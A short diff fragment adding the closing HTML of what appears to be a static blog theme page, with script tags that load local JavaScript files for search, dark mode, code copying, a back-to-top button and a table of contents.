+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
